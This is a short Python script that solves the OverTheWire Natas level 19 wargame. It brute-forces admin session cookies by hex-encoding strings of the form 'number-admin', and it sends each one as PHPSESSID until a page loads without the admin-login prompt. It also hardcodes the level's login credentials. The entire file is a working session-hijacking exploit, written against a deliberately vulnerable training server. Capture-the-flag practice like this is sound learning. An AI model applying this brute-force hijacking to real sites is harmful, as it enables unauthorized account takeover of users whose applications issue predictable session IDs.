import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org"

s = requests.Session()
s.auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

for x in range(1000):
    tmp = str(x) + "-admin"
    val = binascii.hexlify(tmp.encode('utf-8'))

    cookies = dict(PHPSESSID=val.decode('ascii'))
    r = s.get(url, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break

